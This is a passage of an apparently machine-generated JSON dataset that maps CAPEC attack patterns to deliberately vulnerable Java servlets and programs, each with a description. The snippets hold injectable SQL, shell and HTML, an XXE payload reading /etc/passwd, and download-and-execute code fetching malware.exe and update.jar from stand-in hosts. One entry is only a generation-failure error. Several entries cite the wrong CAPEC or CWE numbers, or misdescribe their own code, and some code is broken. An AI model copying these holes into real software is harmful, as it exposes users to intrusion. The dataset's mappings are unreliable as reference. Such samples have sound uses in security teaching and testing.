        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class FlashOverlayServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: Embedding a Flash file with a transparent overlay\n        out.println(\"<html>\");\n        out.println(\"<head><title>Vulnerable Flash Overlay</title></head>\");\n        out.println(\"<body>\");\n        out.println(\"<div style='position:relative;'>\");\n        out.println(\"<iframe src='https://trusted-site.com' style='width:100%; height:100%;'></iframe>\");\n        out.println(\"<embed src='malicious-overlay.swf' style='position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;' allowscriptaccess='always'></embed>\");\n        out.println(\"</div>\");\n        out.println(\"</body>\");\n        out.println(\"</html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerable implementation of a Flash file overlay, which can be used for a clickjacking attack. The servlet generates an HTML page that includes an iframe pointing to a trusted site and an embedded Flash file with a transparent overlay. The Flash file is positioned on top of the iframe, making it invisible to the user but capable of intercepting user actions. This setup exploits CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the Flash overlay to capture clicks intended for the underlying iframe. Additionally, the use of 'allowscriptaccess' set to 'always' can lead to CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), and the inclusion of a potentially dangerous Flash file relates to CWE-434 (Unrestricted Upload of File with Dangerous Type)."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashContentUrl = request.getParameter(\"flashUrl\");\n        if (flashContentUrl != null && !flashContentUrl.isEmpty()) {\n            // CWE-20: Improper Input Validation\n            // CWE-184: Incomplete List of Disallowed Inputs\n            if (!flashContentUrl.matches(\"https?://trusted-domain.com/.*\")) {\n                response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid flash content URL\");\n                return;\n            }\n            // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n            response.setContentType(\"application/x-shockwave-flash\");\n            response.getWriter().write(\"<embed src='\" + flashContentUrl + \"' />\");\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing flash content URL\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of loading Flash content based on user input, embodying the main idea of the CAPEC 'Flash Injection'. The code retrieves a 'flashUrl' parameter from the HTTP request and embeds it into the response without proper validation. This can lead to several security issues:\n\n1. **CWE-20 (Improper Input Validation)**: The input URL is not properly validated, allowing potentially malicious URLs.\n2. **CWE-184 (Incomplete List of Disallowed Inputs)**: The validation only checks for a specific trusted domain, which may be incomplete and insufficient.\n3. **CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)**: The code does not enforce a strict cross-domain policy, allowing untrusted domains to be embedded.\n\nThe code represents the main point of the CAPEC by showing how an attacker could trick a victim into executing malicious Flash content by manipulating the 'flashUrl' parameter."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class WebMailServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userCommand = request.getParameter(\"command\");\n        String email = request.getParameter(\"email\");\n\n        // Vulnerable code: directly using user input in a command\n        String imapCommand = \"IMAP FETCH \" + userCommand + \" FROM \" + email;\n\n        // Execute the command on the IMAP server\n        ProcessBuilder processBuilder = new ProcessBuilder(\"sh\", \"-c\", imapCommand);\n        Process process = processBuilder.start();\n\n        // Capture the output and send it back to the user\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.getWriter().println(line);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of handling IMAP commands based on user input. The servlet receives a 'command' and 'email' parameter from the user's request. It then constructs an IMAP command string using these parameters without proper input validation or sanitization, leading to a potential command injection vulnerability (CWE-77). The constructed command is executed on the IMAP server using a ProcessBuilder, and the output is sent back to the user. This code is susceptible to IMAP/SMTP command injection attacks as described in the CAPEC, where an attacker can inject malicious commands through the 'command' parameter. Additionally, the code does not properly handle or escape special characters (CWE-116), and it may expose sensitive information through error messages (CWE-209, CWE-535)."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-code.jar\";\n        try {\n            downloadAndExecute(url);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadAndExecute(String url) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException {\n        URL website = new URL(url);\n        try (InputStream in = website.openStream(); FileOutputStream fos = new FileOutputStream(\"downloaded.jar\")) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n        }\n        URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"downloaded.jar\").toURI().toURL()});\n        Class<?> clazz = classLoader.loadClass(\"MaliciousClass\");\n        clazz.newInstance();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software integrity attack scenario. The code downloads a JAR file from a remote URL and executes it without verifying the origin or integrity of the code (CWE-494). This can lead to the execution of embedded malicious code (CWE-506). The code represents the main idea of the CAPEC by showing how an attacker can compromise software integrity by injecting and executing malicious code. The lack of integrity checks and proper validation makes the system vulnerable to such attacks."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousDownloader {\n    public static void main(String[] args) {\n        String url = \"http://malicious.example.com/malware.exe\";\n        String fileName = \"malware.exe\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that downloads and executes a file from a remote location without verifying its integrity or origin. The `downloadFile` method downloads a file from a specified URL and saves it locally. The `executeFile` method then executes the downloaded file. This code embodies the CAPEC 'Malicious Software Download' by showing how an attacker could trick a user or an automated process into downloading and running malicious code. The code is vulnerable to CWE-494 (Download of Code Without Integrity Check) as it does not verify the integrity or origin of the downloaded file. It also potentially exposes the system to CWE-506 (Embedded Malicious Code), CWE-509 (Replicating Malicious Code), and CWE-507 (Trojan Horse) by executing untrusted code that could contain hidden malicious functionality."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the malicious update\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            InputStream in = connection.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, bytesRead, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Load and execute the downloaded update without integrity check\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a software update is downloaded and executed without any integrity checks, embodying the CAPEC 'Malicious Software Update'. The code fetches an update from a potentially malicious URL and executes it directly. This represents CWE-494 (Download of Code Without Integrity Check) as it does not verify the origin or integrity of the downloaded code. The downloaded code could contain embedded malicious code (CWE-506), act as a Trojan Horse (CWE-507), or replicate malicious code (CWE-509). This snippet highlights the risks associated with downloading and executing updates from untrusted sources without proper validation."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdater {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update.jar\"); // CWE-494: Download of Code Without Integrity Check\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Execute the downloaded update\n            Runtime.getRuntime().exec(\"java -jar update.jar\"); // CWE-494: Executing code without verifying integrity\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism. The code downloads an update from a specified URL and executes it without verifying the origin or integrity of the downloaded file. This embodies the main idea of CAPEC-494: 'Malicious Automated Software Update via Redirection'. The code is vulnerable to several weaknesses:\n\n1. CWE-494: Download of Code Without Integrity Check - The code downloads an update from a remote location without verifying its integrity or authenticity.\n2. CWE-807: Reliance on Untrusted Inputs in a Security Decision - The URL for the update is hardcoded and could be redirected to a malicious server.\n\nThis snippet highlights the risks associated with failing to properly authenticate and validate software updates, making it susceptible to malicious code injection."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class VulnerableEncryption {\n    // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    public static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // MD5 is considered broken\n            byte[] hash = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hash) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    public static void printSystemInfo() {\n        System.out.println(\"OS: \" + System.getProperty(\"os.name\"));\n        System.out.println(\"User: \" + System.getProperty(\"user.name\"));\n    }\n\n    public static void main(String[] args) {\n        String password = \"password123\";\n        System.out.println(\"Hashed Password: \" + hashPassword(password));\n        printSystemInfo();\n    }\n}",
        "description": "This Java code snippet demonstrates vulnerabilities related to reverse engineering and the associated CWEs. The `hashPassword` method uses the MD5 algorithm, which is known to be broken and risky (CWE-327). This makes it easier for an attacker to reverse-engineer the hashed password. The `printSystemInfo` method exposes sensitive system information (CWE-497) by printing the operating system name and the username, which can be useful for an attacker trying to understand the system's structure and function. Together, these vulnerabilities illustrate how reverse engineering can be facilitated by poor cryptographic practices and exposure of sensitive information."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Arrays;\n\npublic class BlackBoxExample {\n    private static final byte[] SECRET_KEY = {0x1A, 0x2B, 0x3C, 0x4D};\n\n    public static void main(String[] args) throws IOException {\n        InputStream inputStream = System.in;\n        byte[] inputBuffer = new byte[4];\n        int bytesRead = inputStream.read(inputBuffer);\n\n        if (bytesRead == 4) {\n            if (Arrays.equals(inputBuffer, SECRET_KEY)) {\n                System.out.println(\"Access Granted\");\n            } else {\n                System.out.println(\"Access Denied\");\n            }\n        } else {\n            System.out.println(\"Invalid Input Length\");\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple black box reverse engineering scenario. The program reads a 4-byte input from the user and compares it to a secret key. If the input matches the secret key, it prints 'Access Granted'; otherwise, it prints 'Access Denied'. This code is vulnerable to several issues highlighted in the related CWEs:\n\n1. **Observable Discrepancy (CWE-203)**: The program's different responses ('Access Granted', 'Access Denied', 'Invalid Input Length') can be observed by an attacker to infer information about the secret key.\n\n2. **Comparison Logic Vulnerable to Power Side-Channel Attacks (CWE-1255)**: The comparison operation (`Arrays.equals`) could be monitored for power consumption patterns to deduce the secret key.\n\n3. **Improper Protection of Physical Side Channels (CWE-1300)**: The device running this code might emit electromagnetic or acoustic signals during the comparison, which could be analyzed to extract the secret key.\n\n4. **Exposure of Sensitive System Information (CWE-497)**: The program exposes whether the input matches the secret key, which is sensitive information.\n\nThis code snippet demonstrates how black box reverse engineering can exploit observable discrepancies and side-channel information to uncover sensitive data."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        try {\n            // Downloading code without integrity check (CWE-494)\n            URL url = new URL(\"http://example.com/malicious-code.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"downloaded.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Loading the downloaded code (CWE-506)\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"downloaded.jar\");\n            pb.start();\n\n            // Hidden functionality (CWE-912)\n            // This part of the code is not documented and not obvious to users\n            System.out.println(\"Hidden functionality executed\");\n\n            // Exposure of sensitive system information (CWE-497)\n            System.out.println(\"System properties: \" + System.getProperties());\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that embodies the main idea of the CAPEC 'Reverse Engineer an Executable to Expose Assumed Hidden Functionality'. The code downloads a JAR file from a remote location without performing any integrity checks (CWE-494), which could lead to the execution of malicious code (CWE-506). Additionally, the code contains hidden functionality that is not documented or obvious to users (CWE-912). Finally, it exposes sensitive system information by printing system properties (CWE-497). This snippet highlights how an attacker could reverse engineer the executable to discover and exploit these vulnerabilities."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "public class SensitiveDataExample {\n    // CWE-798: Use of Hard-coded Credentials\n    private static final String HARD_CODED_PASSWORD = \"P@ssw0rd123\";\n\n    // CWE-547: Use of Hard-coded, Security-relevant Constants\n    private static final String SECRET_KEY = \"s3cr3tK3y\";\n\n    public static void main(String[] args) {\n        // CWE-318: Cleartext Storage of Sensitive Information in Executable\n        String sensitiveInfo = \"SensitiveData\";\n        System.out.println(\"Sensitive Info: \" + sensitiveInfo);\n\n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        String dynamicSensitiveData = getDynamicSensitiveData();\n        System.out.println(\"Dynamic Sensitive Data: \" + dynamicSensitiveData);\n    }\n\n    private static String getDynamicSensitiveData() {\n        // Simulating retrieval of sensitive data\n        return \"DynamicSensitiveData\";\n    }\n}",
        "description": "This Java code snippet demonstrates several security weaknesses related to the CAPEC 'Read Sensitive Constants Within an Executable'. The code includes hard-coded credentials (CWE-798) and security-relevant constants (CWE-547), which are stored in cleartext within the executable (CWE-318). Additionally, it shows improper control of dynamically-managed code resources (CWE-913) by retrieving and printing sensitive data. This example highlights the risks of embedding sensitive information directly in the code, making it vulnerable to static and dynamic analysis by adversaries."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class VulnerableProtocol {\n    private static final String ALGORITHM = \"AES\";\n    private static final String TRANSFORMATION = \"AES/ECB/PKCS5Padding\";\n    private static final String SECRET_KEY = \"1234567890123456\"; // Weak key\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            Socket clientSocket = serverSocket.accept();\n            DataInputStream dis = new DataInputStream(clientSocket.getInputStream());\n            String encryptedMessage = dis.readUTF();\n            String decryptedMessage = decrypt(encryptedMessage, SECRET_KEY);\n            System.out.println(\"Decrypted message: \" + decryptedMessage);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String decrypt(String encryptedText, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(TRANSFORMATION);\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        cipher.init(Cipher.DECRYPT_MODE, secretKey);\n        byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(encryptedText));\n        return new String(decryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable protocol implementation that embodies the main idea of CAPEC-272 (Protocol Analysis). The code sets up a server socket to receive encrypted messages from a client. It uses a weak encryption key (CWE-326: Inadequate Encryption Strength) and a less secure algorithm (AES/ECB/PKCS5Padding) which is susceptible to various attacks. Additionally, the code transmits sensitive data in cleartext (CWE-319: Cleartext Transmission of Sensitive Information) and does not ensure the strongest algorithm is used during negotiation (CWE-757: Algorithm Downgrade). This makes it easier for an adversary to analyze and potentially compromise the protocol."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        if (fileName != null) {\n            File file = new File(\"/var/www/html/\" + fileName);\n            if (file.exists() && !file.isDirectory()) {\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } else {\n                response.getWriter().println(\"File not found.\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability similar to PHP Remote File Inclusion (RFI). The servlet reads a file name from a request parameter and attempts to read and display the file's contents. The code does not properly sanitize the input, allowing an attacker to specify any file path. This can lead to directory traversal attacks, where an attacker can access sensitive files on the server. The code also does not neutralize special characters, which could lead to XSS vulnerabilities if the file contains malicious scripts. Additionally, the code relies on the file name to determine behavior, which can be exploited by attackers to misclassify files."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String message = input.readLine();\n\n                // Improper Authentication: No verification of the source\n                System.out.println(\"Received message: \" + message);\n\n                // Process the message without verifying its integrity or source\n                if (message.equals(\"admin:shutdown\")) {\n                    System.out.println(\"Shutting down the server...\");\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that listens for incoming connections on port 8080. The server reads messages from clients but does not verify the source or integrity of the messages. This lack of proper authentication and verification allows an attacker to send a falsified message, such as 'admin:shutdown', to perform unauthorized actions like shutting down the server. The code embodies the main idea of the CAPEC 'Fake the Source of Data' by showing how improper authentication and verification can lead to privilege escalation and unauthorized actions."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PrincipalSpoofExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Simulated user database\n        userDatabase.put(\"user1\", \"password1\");\n        userDatabase.put(\"user2\", \"password2\");\n    }\n\n    public static void main(String[] args) {\n        String username = \"user1\";\n        String password = \"password1\";\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // CWE-1390: Weak Authentication\n        // CWE-290: Authentication Bypass by Spoofing\n        if (userDatabase.containsKey(username) && userDatabase.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to Principal Spoofing attacks. The `authenticate` method checks if the provided username and password match an entry in a simulated user database. This represents CWE-1390 (Weak Authentication) and CWE-290 (Authentication Bypass by Spoofing) because the authentication mechanism does not sufficiently prove the claimed identity is correct. An attacker could potentially spoof the identity by crafting a message that appears to come from a legitimate user, exploiting the weak authentication scheme."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import java.util.Base64;\nimport java.util.Random;\n\npublic class SessionManager {\n    private static final String SECRET_KEY = \"default_secret_key\"; // CWE-1391\n    private static final long SESSION_EXPIRATION = 86400000; // 24 hours in milliseconds\n\n    public static String createSessionToken(String username) {\n        long timestamp = System.currentTimeMillis();\n        String token = username + \":\" + timestamp + \":\" + SECRET_KEY;\n        return Base64.getEncoder().encodeToString(token.getBytes());\n    }\n\n    public static boolean validateSessionToken(String token) {\n        try {\n            String decodedToken = new String(Base64.getDecoder().decode(token));\n            String[] parts = decodedToken.split(\":\");\n            if (parts.length != 3) return false;\n\n            String username = parts[0];\n            long timestamp = Long.parseLong(parts[1]);\n            String secretKey = parts[2];\n\n            if (!SECRET_KEY.equals(secretKey)) return false; // CWE-1391\n            if (System.currentTimeMillis() - timestamp > SESSION_EXPIRATION) return false; // CWE-613\n\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        String token = createSessionToken(\"user1\");\n        System.out.println(\"Session Token: \" + token);\n\n        boolean isValid = validateSessionToken(token);\n        System.out.println(\"Is session valid? \" + isValid);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple session management system that is vulnerable to session credential falsification through forging. The `createSessionToken` method generates a session token by concatenating the username, current timestamp, and a secret key, then encoding it in Base64. The `validateSessionToken` method decodes the token and checks if the secret key matches and if the session has expired. The use of a hard-coded secret key (CWE-1391) and the simplistic token generation method make it possible for an attacker to forge a valid session token. Additionally, the session expiration check (CWE-613) is implemented, but the overall approach is insecure and can be exploited by attackers to gain unauthorized access."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Could not parse response content as the length limit was reached - CompletionUsage(completion_tokens=4096, prompt_tokens=499, total_tokens=4595, completion_tokens_details=CompletionTokensDetails(reasoning_tokens=0))"
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class ErrorPageServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String errorMessage = request.getParameter(\"error\");\n        if (errorMessage == null) {\n            errorMessage = \"Unknown error occurred.\";\n        }\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body><h1>Error Page</h1><p>\" + errorMessage + \"</p></body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'XSS Targeting Error Pages' (CAPEC). The servlet takes an 'error' parameter from the HTTP request and directly includes it in the HTML response without proper neutralization. This can lead to Cross-Site Scripting (XSS) attacks if an attacker crafts a URL with a malicious script in the 'error' parameter. The code does not neutralize special characters, making it susceptible to CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page)."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>\" + userInput + \"</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) attacks using alternate syntax. The servlet takes user input from a request parameter and directly includes it in the HTML response without proper sanitization or neutralization. This allows an attacker to inject malicious scripts using alternate forms of script tags (e.g., 'Script', 'ScRiPt') or other special characters that may bypass incomplete denylist-based filters. The code highlights the risk of improper neutralization of alternate XSS syntax (CWE-87), improper neutralization of script-related HTML tags (CWE-80), and incomplete denylist to cross-site scripting (CWE-692)."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import java.sql.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // Improper Input Validation (CWE-20)\n        if (userInput == null || userInput.length() > 100) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid input\");\n            return;\n        }\n        \n        // Incomplete List of Disallowed Inputs (CWE-184)\n        if (userInput.contains(\"<script>\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid input\");\n            return;\n        }\n        \n        // Improper Neutralization of Special Elements (CWE-74)\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        \n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test\", \"root\", \"password\");\n             Statement stmt = conn.createStatement();\n             ResultSet rs = stmt.executeQuery(query)) {\n            while (rs.next()) {\n                response.getWriter().println(\"User: \" + rs.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            throw new ServletException(e);\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates several vulnerabilities related to the removal of filters and improper input handling. The code accepts user input from an HTTP POST request and performs minimal validation. It checks if the input is null or too long (CWE-20) and if it contains a specific disallowed string (CWE-184). However, it fails to properly neutralize special characters in the SQL query (CWE-74), making it susceptible to SQL injection attacks. The code represents the main idea of the CAPEC by showing how inadequate filtering and validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import java.io.*;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                         \"<!DOCTYPE root [<!ENTITY ext SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                         \"<root>&ext;</root>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The code parses an XML string that includes an external entity reference to a local file ('/etc/passwd'). The DocumentBuilderFactory and DocumentBuilder are used to parse the XML without disabling external entity resolution, which can lead to an XML External Entity (XXE) attack. This allows an adversary to access sensitive files on the system. The code embodies CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data) by not validating or restricting the external entities in the XML data."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousClient {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"localhost\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Bypassing client-side authentication\n            out.println(\"AUTHENTICATE user:password\"); // CWE-603: Use of Client-Side Authentication\n\n            // Sending malicious payload\n            out.println(\"<malicious_code>\"); // CWE-506: Embedded Malicious Code\n\n            // Receiving server response\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Creating an emergent resource\n            out.println(\"CREATE_RESOURCE\"); // CWE-1229: Creation of Emergent Resource\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a malicious client application that interfaces with a target service, violating the assumptions the service makes about its clients. The code demonstrates several vulnerabilities: \n1. CWE-603: The client performs authentication by sending credentials directly, which can be bypassed or manipulated.\n2. CWE-506: The client sends a malicious payload to the server, potentially embedding harmful code.\n3. CWE-1229: The client attempts to create an emergent resource on the server, which could be exploited by an attacker.\nThe main idea is to show how a malicious client can exploit server-side assumptions and security weaknesses by sending crafted requests and payloads."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
